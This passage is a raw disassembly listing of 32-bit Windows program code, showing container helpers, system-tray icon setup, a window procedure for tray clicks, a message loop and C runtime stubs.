  40f721:	c1 f9 04             	sar    $0x4,%ecx
  40f724:	51                   	push   %ecx
  40f725:	50                   	push   %eax
  40f726:	8b ce                	mov    %esi,%ecx
  40f728:	e8 f9 3e ff ff       	call   0x403626
  40f72d:	c1 e7 04             	shl    $0x4,%edi
  40f730:	03 7d 0c             	add    0xc(%ebp),%edi
  40f733:	8b ce                	mov    %esi,%ecx
  40f735:	89 7e 0c             	mov    %edi,0xc(%esi)
  40f738:	e8 78 1b ff ff       	call   0x4012b5
  40f73d:	8b c8                	mov    %eax,%ecx
  40f73f:	8b 45 0c             	mov    0xc(%ebp),%eax
  40f742:	03 cb                	add    %ebx,%ecx
  40f744:	89 46 04             	mov    %eax,0x4(%esi)
  40f747:	c1 e1 04             	shl    $0x4,%ecx
  40f74a:	03 c8                	add    %eax,%ecx
  40f74c:	89 4e 08             	mov    %ecx,0x8(%esi)
  40f74f:	e9 85 00 00 00       	jmp    0x40f7d9
  40f754:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40f757:	8b d0                	mov    %eax,%edx
  40f759:	2b d1                	sub    %ecx,%edx
  40f75b:	c1 fa 04             	sar    $0x4,%edx
  40f75e:	3b d3                	cmp    %ebx,%edx
  40f760:	73 41                	jae    0x40f7a3
  40f762:	8b fb                	mov    %ebx,%edi
  40f764:	c1 e7 04             	shl    $0x4,%edi
  40f767:	8d 14 0f             	lea    (%edi,%ecx,1),%edx
  40f76a:	52                   	push   %edx
  40f76b:	50                   	push   %eax
  40f76c:	51                   	push   %ecx
  40f76d:	8b ce                	mov    %esi,%ecx
  40f76f:	e8 c7 8e ff ff       	call   0x40863b
  40f774:	8b 46 08             	mov    0x8(%esi),%eax
  40f777:	ff 75 10             	push   0x10(%ebp)
  40f77a:	8b c8                	mov    %eax,%ecx
  40f77c:	2b 4d 08             	sub    0x8(%ebp),%ecx
  40f77f:	c1 f9 04             	sar    $0x4,%ecx
  40f782:	2b d9                	sub    %ecx,%ebx
  40f784:	8b ce                	mov    %esi,%ecx
  40f786:	53                   	push   %ebx
  40f787:	50                   	push   %eax
  40f788:	e8 00 24 ff ff       	call   0x401b8d
  40f78d:	ff 75 10             	push   0x10(%ebp)
  40f790:	ff 76 08             	push   0x8(%esi)
  40f793:	ff 75 08             	push   0x8(%ebp)
  40f796:	e8 63 00 00 00       	call   0x40f7fe
  40f79b:	83 c4 0c             	add    $0xc,%esp
  40f79e:	01 7e 08             	add    %edi,0x8(%esi)
  40f7a1:	eb 36                	jmp    0x40f7d9
  40f7a3:	85 db                	test   %ebx,%ebx
  40f7a5:	76 32                	jbe    0x40f7d9
  40f7a7:	c1 e3 04             	shl    $0x4,%ebx
  40f7aa:	50                   	push   %eax
  40f7ab:	50                   	push   %eax
  40f7ac:	2b c3                	sub    %ebx,%eax
  40f7ae:	8b ce                	mov    %esi,%ecx
  40f7b0:	50                   	push   %eax
  40f7b1:	e8 85 8e ff ff       	call   0x40863b
  40f7b6:	8b 46 08             	mov    0x8(%esi),%eax
  40f7b9:	8b 7d 08             	mov    0x8(%ebp),%edi
  40f7bc:	50                   	push   %eax
  40f7bd:	2b c3                	sub    %ebx,%eax
  40f7bf:	50                   	push   %eax
  40f7c0:	57                   	push   %edi
  40f7c1:	e8 57 00 00 00       	call   0x40f81d
  40f7c6:	ff 75 10             	push   0x10(%ebp)
  40f7c9:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  40f7cc:	50                   	push   %eax
  40f7cd:	57                   	push   %edi
  40f7ce:	e8 2b 00 00 00       	call   0x40f7fe
  40f7d3:	83 c4 18             	add    $0x18,%esp
  40f7d6:	01 5e 08             	add    %ebx,0x8(%esi)
  40f7d9:	5f                   	pop    %edi
  40f7da:	5e                   	pop    %esi
  40f7db:	5b                   	pop    %ebx
  40f7dc:	c9                   	leave
  40f7dd:	c2 0c 00             	ret    $0xc
  40f7e0:	55                   	push   %ebp
  40f7e1:	8b ec                	mov    %esp,%ebp
  40f7e3:	8b 45 08             	mov    0x8(%ebp),%eax
  40f7e6:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40f7e9:	74 0e                	je     0x40f7f9
  40f7eb:	8b 55 10             	mov    0x10(%ebp),%edx
  40f7ee:	8a 08                	mov    (%eax),%cl
  40f7f0:	ff 45 10             	incl   0x10(%ebp)
  40f7f3:	40                   	inc    %eax
  40f7f4:	88 0a                	mov    %cl,(%edx)
  40f7f6:	40                   	inc    %eax
  40f7f7:	eb ed                	jmp    0x40f7e6
  40f7f9:	8b 45 10             	mov    0x10(%ebp),%eax
  40f7fc:	5d                   	pop    %ebp
  40f7fd:	c3                   	ret
  40f7fe:	55                   	push   %ebp
  40f7ff:	8b ec                	mov    %esp,%ebp
  40f801:	56                   	push   %esi
  40f802:	8b 75 08             	mov    0x8(%ebp),%esi
  40f805:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40f808:	74 10                	je     0x40f81a
  40f80a:	ff 75 10             	push   0x10(%ebp)
  40f80d:	8b ce                	mov    %esi,%ecx
  40f80f:	ff 15 64 02 41 00    	call   *0x410264
  40f815:	83 c6 10             	add    $0x10,%esi
  40f818:	eb eb                	jmp    0x40f805
  40f81a:	5e                   	pop    %esi
  40f81b:	5d                   	pop    %ebp
  40f81c:	c3                   	ret
  40f81d:	55                   	push   %ebp
  40f81e:	8b ec                	mov    %esp,%ebp
  40f820:	56                   	push   %esi
  40f821:	8b 75 0c             	mov    0xc(%ebp),%esi
  40f824:	39 75 08             	cmp    %esi,0x8(%ebp)
  40f827:	74 16                	je     0x40f83f
  40f829:	83 6d 10 10          	subl   $0x10,0x10(%ebp)
  40f82d:	83 ee 10             	sub    $0x10,%esi
  40f830:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40f833:	56                   	push   %esi
  40f834:	ff 15 64 02 41 00    	call   *0x410264
  40f83a:	3b 75 08             	cmp    0x8(%ebp),%esi
  40f83d:	75 ea                	jne    0x40f829
  40f83f:	8b 45 10             	mov    0x10(%ebp),%eax
  40f842:	5e                   	pop    %esi
  40f843:	5d                   	pop    %ebp
  40f844:	c3                   	ret
  40f845:	e8 05 00 00 00       	call   0x40f84f
  40f84a:	e9 0b 00 00 00       	jmp    0x40f85a
  40f84f:	b9 a5 5b 41 00       	mov    $0x415ba5,%ecx
  40f854:	ff 25 dc 01 41 00    	jmp    *0x4101dc
  40f85a:	68 66 f8 40 00       	push   $0x40f866
  40f85f:	e8 56 04 00 00       	call   0x40fcba
  40f864:	59                   	pop    %ecx
  40f865:	c3                   	ret
  40f866:	b9 a5 5b 41 00       	mov    $0x415ba5,%ecx
  40f86b:	ff 25 e0 01 41 00    	jmp    *0x4101e0
  40f871:	e8 05 00 00 00       	call   0x40f87b
  40f876:	e9 0b 00 00 00       	jmp    0x40f886
  40f87b:	b9 a4 5b 41 00       	mov    $0x415ba4,%ecx
  40f880:	ff 25 e4 01 41 00    	jmp    *0x4101e4
  40f886:	68 92 f8 40 00       	push   $0x40f892
  40f88b:	e8 2a 04 00 00       	call   0x40fcba
  40f890:	59                   	pop    %ecx
  40f891:	c3                   	ret
  40f892:	b9 a4 5b 41 00       	mov    $0x415ba4,%ecx
  40f897:	ff 25 e8 01 41 00    	jmp    *0x4101e8
  40f89d:	e9 00 00 00 00       	jmp    0x40f8a2
  40f8a2:	68 b0 18 41 00       	push   $0x4118b0
  40f8a7:	68 b0 10 41 00       	push   $0x4110b0
  40f8ac:	ff 15 40 01 41 00    	call   *0x410140
  40f8b2:	50                   	push   %eax
  40f8b3:	ff 15 44 01 41 00    	call   *0x410144
  40f8b9:	a3 a8 5b 41 00       	mov    %eax,0x415ba8
  40f8be:	c3                   	ret
  40f8bf:	55                   	push   %ebp
  40f8c0:	8b ec                	mov    %esp,%ebp
  40f8c2:	81 ec 20 01 00 00    	sub    $0x120,%esp
  40f8c8:	56                   	push   %esi
  40f8c9:	57                   	push   %edi
  40f8ca:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40f8d0:	68 04 01 00 00       	push   $0x104
  40f8d5:	33 f6                	xor    %esi,%esi
  40f8d7:	50                   	push   %eax
  40f8d8:	56                   	push   %esi
  40f8d9:	ff 15 6c 00 41 00    	call   *0x41006c
  40f8df:	e8 94 00 00 00       	call   0x40f978
  40f8e4:	a3 b4 5b 41 00       	mov    %eax,0x415bb4
  40f8e9:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40f8ef:	56                   	push   %esi
  40f8f0:	50                   	push   %eax
  40f8f1:	56                   	push   %esi
  40f8f2:	c7 05 b0 5b 41 00 58 	movl   $0x58,0x415bb0
  40f8f9:	00 00 00 
  40f8fc:	c7 05 b8 5b 41 00 01 	movl   $0x1,0x415bb8
  40f903:	00 00 00 
  40f906:	c7 05 c0 5b 41 00 01 	movl   $0x401,0x415bc0
  40f90d:	04 00 00 
  40f910:	ff 15 c0 03 41 00    	call   *0x4103c0
  40f916:	6a 40                	push   $0x40
  40f918:	a3 c4 5b 41 00       	mov    %eax,0x415bc4
  40f91d:	ff 35 20 51 41 00    	push   0x415120
  40f923:	68 c8 5b 41 00       	push   $0x415bc8
  40f928:	ff 15 20 01 41 00    	call   *0x410120
  40f92e:	68 b0 5b 41 00       	push   $0x415bb0
  40f933:	56                   	push   %esi
  40f934:	c7 05 bc 5b 41 00 07 	movl   $0x7,0x415bbc
  40f93b:	00 00 00 
  40f93e:	ff 15 c4 03 41 00    	call   *0x4103c4
  40f944:	8b 3d 50 04 41 00    	mov    0x410450,%edi
  40f94a:	56                   	push   %esi
  40f94b:	56                   	push   %esi
  40f94c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40f94f:	56                   	push   %esi
  40f950:	50                   	push   %eax
  40f951:	ff d7                	call   *%edi
  40f953:	85 c0                	test   %eax,%eax
  40f955:	74 1d                	je     0x40f974
  40f957:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40f95a:	50                   	push   %eax
  40f95b:	ff 15 54 04 41 00    	call   *0x410454
  40f961:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40f964:	50                   	push   %eax
  40f965:	ff 15 60 04 41 00    	call   *0x410460
  40f96b:	56                   	push   %esi
  40f96c:	56                   	push   %esi
  40f96d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40f970:	56                   	push   %esi
  40f971:	50                   	push   %eax
  40f972:	eb dd                	jmp    0x40f951
  40f974:	5f                   	pop    %edi
  40f975:	5e                   	pop    %esi
  40f976:	c9                   	leave
  40f977:	c3                   	ret
  40f978:	55                   	push   %ebp
  40f979:	8b ec                	mov    %esp,%ebp
  40f97b:	83 ec 40             	sub    $0x40,%esp
  40f97e:	56                   	push   %esi
  40f97f:	57                   	push   %edi
  40f980:	6a 0b                	push   $0xb
  40f982:	33 c0                	xor    %eax,%eax
  40f984:	59                   	pop    %ecx
  40f985:	8d 7d c4             	lea    -0x3c(%ebp),%edi
  40f988:	f3 ab                	rep stos %eax,%es:(%edi)
  40f98a:	be c4 18 41 00       	mov    $0x4118c4,%esi
  40f98f:	8d 7d f0             	lea    -0x10(%ebp),%edi
  40f992:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40f993:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40f994:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40f995:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40f997:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40f99a:	c7 45 c0 30 00 00 00 	movl   $0x30,-0x40(%ebp)
  40f9a1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40f9a2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40f9a5:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40f9a8:	33 f6                	xor    %esi,%esi
  40f9aa:	50                   	push   %eax
  40f9ab:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40f9ae:	c7 45 c8 ef f9 40 00 	movl   $0x40f9ef,-0x38(%ebp)
  40f9b5:	89 75 cc             	mov    %esi,-0x34(%ebp)
  40f9b8:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40f9bb:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40f9be:	ff 15 28 04 41 00    	call   *0x410428
  40f9c4:	66 85 c0             	test   %ax,%ax
  40f9c7:	74 20                	je     0x40f9e9
  40f9c9:	56                   	push   %esi
  40f9ca:	56                   	push   %esi
  40f9cb:	56                   	push   %esi
  40f9cc:	6a fd                	push   $0xfffffffd
  40f9ce:	56                   	push   %esi
  40f9cf:	56                   	push   %esi
  40f9d0:	56                   	push   %esi
  40f9d1:	56                   	push   %esi
  40f9d2:	56                   	push   %esi
  40f9d3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40f9d6:	56                   	push   %esi
  40f9d7:	50                   	push   %eax
  40f9d8:	56                   	push   %esi
  40f9d9:	ff 15 24 04 41 00    	call   *0x410424
  40f9df:	3b c6                	cmp    %esi,%eax
  40f9e1:	75 08                	jne    0x40f9eb
  40f9e3:	ff 15 3c 01 41 00    	call   *0x41013c
  40f9e9:	33 c0                	xor    %eax,%eax
  40f9eb:	5f                   	pop    %edi
  40f9ec:	5e                   	pop    %esi
  40f9ed:	c9                   	leave
  40f9ee:	c3                   	ret
  40f9ef:	55                   	push   %ebp
  40f9f0:	8b ec                	mov    %esp,%ebp
  40f9f2:	51                   	push   %ecx
  40f9f3:	51                   	push   %ecx
  40f9f4:	8b 45 0c             	mov    0xc(%ebp),%eax
  40f9f7:	48                   	dec    %eax
  40f9f8:	0f 84 ce 00 00 00    	je     0x40facc
  40f9fe:	2d 10 01 00 00       	sub    $0x110,%eax
  40fa03:	0f 84 a6 00 00 00    	je     0x40faaf
  40fa09:	2d f0 02 00 00       	sub    $0x2f0,%eax
  40fa0e:	74 17                	je     0x40fa27
  40fa10:	ff 75 14             	push   0x14(%ebp)
  40fa13:	ff 75 10             	push   0x10(%ebp)
  40fa16:	ff 75 0c             	push   0xc(%ebp)
  40fa19:	ff 75 08             	push   0x8(%ebp)
  40fa1c:	ff 15 40 04 41 00    	call   *0x410440
  40fa22:	e9 c2 00 00 00       	jmp    0x40fae9
  40fa27:	8b 45 14             	mov    0x14(%ebp),%eax
  40fa2a:	2d 01 02 00 00       	sub    $0x201,%eax
  40fa2f:	74 42                	je     0x40fa73
  40fa31:	83 e8 03             	sub    $0x3,%eax
  40fa34:	74 0d                	je     0x40fa43
  40fa36:	ff 75 14             	push   0x14(%ebp)
  40fa39:	ff 75 10             	push   0x10(%ebp)
  40fa3c:	68 01 04 00 00       	push   $0x401
  40fa41:	eb d6                	jmp    0x40fa19
  40fa43:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40fa46:	50                   	push   %eax
  40fa47:	ff 15 3c 04 41 00    	call   *0x41043c
  40fa4d:	ff 75 08             	push   0x8(%ebp)
  40fa50:	ff 15 38 04 41 00    	call   *0x410438
  40fa56:	6a 00                	push   $0x0
  40fa58:	ff 75 08             	push   0x8(%ebp)
  40fa5b:	6a 00                	push   $0x0
  40fa5d:	ff 75 fc             	push   -0x4(%ebp)
  40fa60:	ff 75 f8             	push   -0x8(%ebp)
  40fa63:	6a 00                	push   $0x0
  40fa65:	ff 35 a0 5b 41 00    	push   0x415ba0
  40fa6b:	ff 15 34 04 41 00    	call   *0x410434
  40fa71:	eb 74                	jmp    0x40fae7
  40fa73:	ff 35 ac 5b 41 00    	push   0x415bac
  40fa79:	ff 15 64 04 41 00    	call   *0x410464
  40fa7f:	85 c0                	test   %eax,%eax
  40fa81:	74 10                	je     0x40fa93
  40fa83:	6a 00                	push   $0x0
  40fa85:	ff 35 ac 5b 41 00    	push   0x415bac
  40fa8b:	ff 15 0c 04 41 00    	call   *0x41040c
  40fa91:	eb 54                	jmp    0x40fae7
  40fa93:	6a 09                	push   $0x9
  40fa95:	ff 35 ac 5b 41 00    	push   0x415bac
  40fa9b:	ff 15 0c 04 41 00    	call   *0x41040c
  40faa1:	ff 35 ac 5b 41 00    	push   0x415bac
  40faa7:	ff 15 38 04 41 00    	call   *0x410438
  40faad:	eb 38                	jmp    0x40fae7
  40faaf:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40fab3:	75 32                	jne    0x40fae7
  40fab5:	68 b0 5b 41 00       	push   $0x415bb0
  40faba:	6a 02                	push   $0x2
  40fabc:	ff 15 c4 03 41 00    	call   *0x4103c4
  40fac2:	6a 00                	push   $0x0
  40fac4:	ff 15 24 01 41 00    	call   *0x410124
  40faca:	eb 1b                	jmp    0x40fae7
  40facc:	ff 15 30 04 41 00    	call   *0x410430
  40fad2:	68 d4 18 41 00       	push   $0x4118d4
  40fad7:	6a 00                	push   $0x0
  40fad9:	6a 00                	push   $0x0
  40fadb:	50                   	push   %eax
  40fadc:	a3 a0 5b 41 00       	mov    %eax,0x415ba0
  40fae1:	ff 15 2c 04 41 00    	call   *0x41042c
  40fae7:	33 c0                	xor    %eax,%eax
  40fae9:	c9                   	leave
  40faea:	c2 10 00             	ret    $0x10
  40faed:	55                   	push   %ebp
  40faee:	8b ec                	mov    %esp,%ebp
  40faf0:	81 ec e8 03 00 00    	sub    $0x3e8,%esp
  40faf6:	53                   	push   %ebx
  40faf7:	56                   	push   %esi
  40faf8:	57                   	push   %edi
  40faf9:	ff 15 28 01 41 00    	call   *0x410128
  40faff:	ff 15 a8 5b 41 00    	call   *0x415ba8
  40fb05:	33 db                	xor    %ebx,%ebx
  40fb07:	a3 ac 5b 41 00       	mov    %eax,0x415bac
  40fb0c:	38 5d 08             	cmp    %bl,0x8(%ebp)
  40fb0f:	75 08                	jne    0x40fb19
  40fb11:	53                   	push   %ebx
  40fb12:	50                   	push   %eax
  40fb13:	ff 15 0c 04 41 00    	call   *0x41040c
  40fb19:	a1 44 03 41 00       	mov    0x410344,%eax
  40fb1e:	83 c0 20             	add    $0x20,%eax
  40fb21:	50                   	push   %eax
  40fb22:	68 0c 19 41 00       	push   $0x41190c
  40fb27:	68 04 19 41 00       	push   $0x411904
  40fb2c:	ff 15 48 03 41 00    	call   *0x410348
  40fb32:	b9 f9 00 00 00       	mov    $0xf9,%ecx
  40fb37:	33 c0                	xor    %eax,%eax
  40fb39:	8d bd 19 fc ff ff    	lea    -0x3e7(%ebp),%edi
  40fb3f:	88 9d 18 fc ff ff    	mov    %bl,-0x3e8(%ebp)
  40fb45:	f3 ab                	rep stos %eax,%es:(%edi)
  40fb47:	66 ab                	stos   %ax,%es:(%edi)
  40fb49:	aa                   	stos   %al,%es:(%edi)
  40fb4a:	83 ca ff             	or     $0xffffffff,%edx
  40fb4d:	bf f8 18 41 00       	mov    $0x4118f8,%edi
  40fb52:	8b ca                	mov    %edx,%ecx
  40fb54:	33 c0                	xor    %eax,%eax
  40fb56:	f2 ae                	repnz scas %es:(%edi),%al
  40fb58:	f7 d1                	not    %ecx
  40fb5a:	2b f9                	sub    %ecx,%edi
  40fb5c:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40fb62:	8b c1                	mov    %ecx,%eax
  40fb64:	8b f7                	mov    %edi,%esi
  40fb66:	8b fb                	mov    %ebx,%edi
  40fb68:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40fb6e:	c1 e9 02             	shr    $0x2,%ecx
  40fb71:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40fb73:	8b c8                	mov    %eax,%ecx
  40fb75:	33 c0                	xor    %eax,%eax
  40fb77:	83 e1 03             	and    $0x3,%ecx
  40fb7a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40fb7c:	bf fc 12 41 00       	mov    $0x4112fc,%edi
  40fb81:	8b ca                	mov    %edx,%ecx
  40fb83:	f2 ae                	repnz scas %es:(%edi),%al
  40fb85:	f7 d1                	not    %ecx
  40fb87:	2b f9                	sub    %ecx,%edi
  40fb89:	8b f7                	mov    %edi,%esi
  40fb8b:	8b fb                	mov    %ebx,%edi
  40fb8d:	8b d9                	mov    %ecx,%ebx
  40fb8f:	8b ca                	mov    %edx,%ecx
  40fb91:	f2 ae                	repnz scas %es:(%edi),%al
  40fb93:	8b cb                	mov    %ebx,%ecx
  40fb95:	4f                   	dec    %edi
  40fb96:	c1 e9 02             	shr    $0x2,%ecx
  40fb99:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40fb9b:	8b cb                	mov    %ebx,%ecx
  40fb9d:	8d 9d 18 fc ff ff    	lea    -0x3e8(%ebp),%ebx
  40fba3:	83 e1 03             	and    $0x3,%ecx
  40fba6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40fba8:	bf dc 18 41 00       	mov    $0x4118dc,%edi
  40fbad:	8b ca                	mov    %edx,%ecx
  40fbaf:	f2 ae                	repnz scas %es:(%edi),%al
  40fbb1:	f7 d1                	not    %ecx
  40fbb3:	2b f9                	sub    %ecx,%edi
  40fbb5:	8b f7                	mov    %edi,%esi
  40fbb7:	8b fb                	mov    %ebx,%edi
  40fbb9:	8b d9                	mov    %ecx,%ebx
  40fbbb:	8b ca                	mov    %edx,%ecx
  40fbbd:	f2 ae                	repnz scas %es:(%edi),%al
  40fbbf:	8b cb                	mov    %ebx,%ecx
  40fbc1:	4f                   	dec    %edi
  40fbc2:	c1 e9 02             	shr    $0x2,%ecx
  40fbc5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40fbc7:	8b cb                	mov    %ebx,%ecx
  40fbc9:	8d 85 18 fc ff ff    	lea    -0x3e8(%ebp),%eax
  40fbcf:	83 e1 03             	and    $0x3,%ecx
  40fbd2:	50                   	push   %eax
  40fbd3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40fbd5:	ff 15 74 03 41 00    	call   *0x410374
  40fbdb:	83 c4 10             	add    $0x10,%esp
  40fbde:	5f                   	pop    %edi
  40fbdf:	5e                   	pop    %esi
  40fbe0:	5b                   	pop    %ebx
  40fbe1:	c9                   	leave
  40fbe2:	c3                   	ret
  40fbe3:	cc                   	int3
  40fbe4:	ff 25 7c 00 41 00    	jmp    *0x41007c
  40fbea:	ff 25 80 00 41 00    	jmp    *0x410080
  40fbf0:	ff 25 84 00 41 00    	jmp    *0x410084
  40fbf6:	ff 25 9c 00 41 00    	jmp    *0x41009c
  40fbfc:	ff 25 a0 00 41 00    	jmp    *0x4100a0
  40fc02:	ff 25 3c 02 41 00    	jmp    *0x41023c
  40fc08:	ff 25 40 02 41 00    	jmp    *0x410240
  40fc0e:	ff 25 44 02 41 00    	jmp    *0x410244
  40fc14:	ff 25 68 02 41 00    	jmp    *0x410268
  40fc1a:	ff 25 6c 02 41 00    	jmp    *0x41026c
  40fc20:	ff 25 88 02 41 00    	jmp    *0x410288
  40fc26:	ff 25 8c 02 41 00    	jmp    *0x41028c
  40fc2c:	ff 74 24 04          	push   0x4(%esp)
  40fc30:	e8 af 00 00 00       	call   0x40fce4
  40fc35:	59                   	pop    %ecx
  40fc36:	c3                   	ret
  40fc37:	cc                   	int3
  40fc38:	ff 25 b8 02 41 00    	jmp    *0x4102b8
  40fc3e:	ff 25 c8 02 41 00    	jmp    *0x4102c8
  40fc44:	ff 25 d4 02 41 00    	jmp    *0x4102d4
  40fc4a:	ff 25 00 03 41 00    	jmp    *0x410300
  40fc50:	ff 25 f4 01 41 00    	jmp    *0x4101f4
  40fc56:	ff 25 fc 01 41 00    	jmp    *0x4101fc
  40fc5c:	cc                   	int3
  40fc5d:	cc                   	int3
  40fc5e:	cc                   	int3
  40fc5f:	cc                   	int3
  40fc60:	ff 25 a8 03 41 00    	jmp    *0x4103a8
  40fc66:	ff 25 b0 03 41 00    	jmp    *0x4103b0
  40fc6c:	56                   	push   %esi
  40fc6d:	8b f1                	mov    %ecx,%esi
  40fc6f:	e8 72 02 00 00       	call   0x40fee6
  40fc74:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40fc79:	74 07                	je     0x40fc82
  40fc7b:	56                   	push   %esi
  40fc7c:	e8 ab ff ff ff       	call   0x40fc2c
  40fc81:	59                   	pop    %ecx
  40fc82:	8b c6                	mov    %esi,%eax
  40fc84:	5e                   	pop    %esi
  40fc85:	c2 04 00             	ret    $0x4
  40fc88:	ff 25 b4 03 41 00    	jmp    *0x4103b4
  40fc8e:	83 3d 20 5c 41 00 ff 	cmpl   $0xffffffff,0x415c20
  40fc95:	75 0c                	jne    0x40fca3
  40fc97:	ff 74 24 04          	push   0x4(%esp)
  40fc9b:	ff 15 38 03 41 00    	call   *0x410338
  40fca1:	59                   	pop    %ecx
  40fca2:	c3                   	ret
  40fca3:	68 1c 5c 41 00       	push   $0x415c1c
  40fca8:	68 20 5c 41 00       	push   $0x415c20
  40fcad:	ff 74 24 0c          	push   0xc(%esp)
  40fcb1:	e8 36 02 00 00       	call   0x40feec
  40fcb6:	83 c4 0c             	add    $0xc,%esp
  40fcb9:	c3                   	ret
  40fcba:	ff 74 24 04          	push   0x4(%esp)
  40fcbe:	e8 cb ff ff ff       	call   0x40fc8e
  40fcc3:	f7 d8                	neg    %eax
  40fcc5:	1b c0                	sbb    %eax,%eax
  40fcc7:	59                   	pop    %ecx
  40fcc8:	f7 d8                	neg    %eax
  40fcca:	48                   	dec    %eax
  40fccb:	c3                   	ret
  40fccc:	ff 25 a4 03 41 00    	jmp    *0x4103a4
  40fcd2:	ff 25 a0 03 41 00    	jmp    *0x4103a0
  40fcd8:	ff 25 88 03 41 00    	jmp    *0x410388
  40fcde:	ff 25 84 03 41 00    	jmp    *0x410384
  40fce4:	ff 25 80 03 41 00    	jmp    *0x410380
  40fcea:	cc                   	int3
  40fceb:	cc                   	int3
  40fcec:	cc                   	int3
  40fced:	cc                   	int3
  40fcee:	cc                   	int3
  40fcef:	cc                   	int3
  40fcf0:	51                   	push   %ecx
  40fcf1:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40fcf6:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40fcfa:	72 14                	jb     0x40fd10
  40fcfc:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40fd02:	2d 00 10 00 00       	sub    $0x1000,%eax
  40fd07:	85 01                	test   %eax,(%ecx)
  40fd09:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40fd0e:	73 ec                	jae    0x40fcfc
  40fd10:	2b c8                	sub    %eax,%ecx
  40fd12:	8b c4                	mov    %esp,%eax
  40fd14:	85 01                	test   %eax,(%ecx)
  40fd16:	8b e1                	mov    %ecx,%esp
  40fd18:	8b 08                	mov    (%eax),%ecx
  40fd1a:	8b 40 04             	mov    0x4(%eax),%eax
  40fd1d:	50                   	push   %eax
  40fd1e:	c3                   	ret
  40fd1f:	cc                   	int3
  40fd20:	53                   	push   %ebx
  40fd21:	56                   	push   %esi
  40fd22:	8b 44 24 18          	mov    0x18(%esp),%eax
  40fd26:	0b c0                	or     %eax,%eax
  40fd28:	75 18                	jne    0x40fd42
  40fd2a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40fd2e:	8b 44 24 10          	mov    0x10(%esp),%eax
  40fd32:	33 d2                	xor    %edx,%edx
  40fd34:	f7 f1                	div    %ecx
  40fd36:	8b d8                	mov    %eax,%ebx
  40fd38:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40fd3c:	f7 f1                	div    %ecx
  40fd3e:	8b d3                	mov    %ebx,%edx
  40fd40:	eb 41                	jmp    0x40fd83
  40fd42:	8b c8                	mov    %eax,%ecx
  40fd44:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40fd48:	8b 54 24 10          	mov    0x10(%esp),%edx
  40fd4c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40fd50:	d1 e9                	shr    $1,%ecx
  40fd52:	d1 db                	rcr    $1,%ebx
  40fd54:	d1 ea                	shr    $1,%edx
  40fd56:	d1 d8                	rcr    $1,%eax
  40fd58:	0b c9                	or     %ecx,%ecx
  40fd5a:	75 f4                	jne    0x40fd50
  40fd5c:	f7 f3                	div    %ebx
  40fd5e:	8b f0                	mov    %eax,%esi
  40fd60:	f7 64 24 18          	mull   0x18(%esp)
  40fd64:	8b c8                	mov    %eax,%ecx
  40fd66:	8b 44 24 14          	mov    0x14(%esp),%eax
  40fd6a:	f7 e6                	mul    %esi
  40fd6c:	03 d1                	add    %ecx,%edx
  40fd6e:	72 0e                	jb     0x40fd7e
  40fd70:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40fd74:	77 08                	ja     0x40fd7e
  40fd76:	72 07                	jb     0x40fd7f
  40fd78:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40fd7c:	76 01                	jbe    0x40fd7f
  40fd7e:	4e                   	dec    %esi
  40fd7f:	33 d2                	xor    %edx,%edx
  40fd81:	8b c6                	mov    %esi,%eax
  40fd83:	5e                   	pop    %esi
  40fd84:	5b                   	pop    %ebx
  40fd85:	c2 10 00             	ret    $0x10
  40fd88:	55                   	push   %ebp
  40fd89:	8b ec                	mov    %esp,%ebp
  40fd8b:	6a ff                	push   $0xffffffff
  40fd8d:	68 18 19 41 00       	push   $0x411918
  40fd92:	68 60 fc 40 00       	push   $0x40fc60
  40fd97:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40fd9d:	50                   	push   %eax
  40fd9e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40fda5:	83 ec 68             	sub    $0x68,%esp
  40fda8:	53                   	push   %ebx
  40fda9:	56                   	push   %esi
  40fdaa:	57                   	push   %edi
  40fdab:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40fdae:	33 db                	xor    %ebx,%ebx
  40fdb0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40fdb3:	6a 02                	push   $0x2
  40fdb5:	ff 15 10 03 41 00    	call   *0x410310
  40fdbb:	59                   	pop    %ecx
